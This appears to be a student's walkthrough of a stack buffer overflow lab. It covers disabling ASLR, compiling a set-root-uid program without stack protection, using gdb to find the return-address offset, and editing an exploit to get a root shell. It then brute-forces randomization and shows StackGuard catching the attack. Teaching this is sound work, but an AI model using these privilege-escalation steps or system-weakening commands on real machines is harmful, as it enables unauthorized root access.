# Task 1: Exploiting the Vulnerability
## preparation

Disable address apace randomization:

    sudo sysctl -w kernel.randomize_va_space=0

Create an empty badfile for debugger:

    touch badfile

**NOTE**: If you are using Ubuntu 16.04 or later, the default `dash` shell will not work properly (you won't get a root shell). Use following commands to replace `dash` by `zsh` before starting:

    sudo apt-get install zsh
    sudo rm /bin/sh
    sudo ln -s /bin/zsh /bin/sh
    exit

## test `call_shellcode.c`

    gcc -z execstack -o call_shellcode call_shellcode.c
    ./call_shellcode

A shell should be invoked here

## edit and compile `stack.c`

Insert codes after `char buffer[24];` :

```c
printf("%p\n", buffer);
```

Then compile `stack.c` in root account, and make it *set-root-uid*:

    su root
    gcc -o stack -z execstack -fno-stack-protector stack.c
    chmod 4755 stack
    exit

## check buffer address & offset

First run stack:

    ./stack

Take the output address as ***BUF***. You can also see an output `Returned Properly` here.

Then start gdb and disassemble function `bof`:

    gdb stack
    disas bof

Take the offset of the instruction `<strcpy>` as N. Set two breakpoints and start to run:

    b *(bof+0)
    b *(bof+N)
    r
    x/x $esp

You can get `addrA: xxxx` which shows the memory that contains return address. Then continue:

    c
    x/x $esp

Here you'll get `xxxx: addrB` which represents the start address of `buffer` in gdb. Now you can calculate offset:

    p addrA-addrB

Copy ***OFFSET*** *= addA - addrB* calculated above, then quit gdb:

    q
    y

## edit `exploit.c`

Insert codes after `memset(&buffer, 0x90, 517);` :

```c
long addr = BUF + OFFSET + 4;
long *ptr = (long *) (buffer + OFFSET);
*ptr = addr;
strcpy(buffer + OFFSET + 4, shellcode);
```

## compile `exploit.c` and run!

    gcc -o exploit exploit.c
    ./exploit
    ./stack

You should see a **#** here, which means you've got a root shell! You can check this by typing the following:

    id
    whoami

# Task 2: Address Randomization

First turn on address randomization and try to run `stack`:

    sudo sysctl -w kernel.randomize_va_space=2
    ./stack

You should see a different output address, and an error `Segmentation fault (core dumped)` occered.

## edit `exploit.c`

Replace `BUF` with the address shown above, and change the destiny of `srtcpy` to the end of `buffer` as long as it can hold shellcode:

```c
long addr = BUF + OFFSET + 4;
long *ptr = (long *) (buffer + OFFSET);
*ptr = addr;
strcpy(buffer + 480, shellcode);
```

## complie `exploit.c` and run `stack` in a loop

    gcc -o exploit exploit.c
    ./exploit
    sh -c "while [ l ]; do ./stack; done;"

Wait for a while until you get a root shell again!

# Task 3: Stack Guard

Turn off the address randomization again, and recompile `stack.c` with stack guard:

    sudo sysctl -w kernel.randomize_va_space=0
    sudo gcc -o stack -z execstack stack.c
    sudo chmod 4755 stack

Edit `exploit.c` to older version done in Task 1 (just recover `BUF`):

```c
long addr = BUF + OFFSET + 4;
long *ptr = (long *) (buffer + OFFSET);
*ptr = addr;
strcpy(buffer + 480, shellcode);
```

See what will happen:

    gcc -o exploit exploit.c
    ./exploit
    ./stack

You should see an error message here:

    *** stack smashing detected ***: ./stack terminated
    Aborted (core dumped)
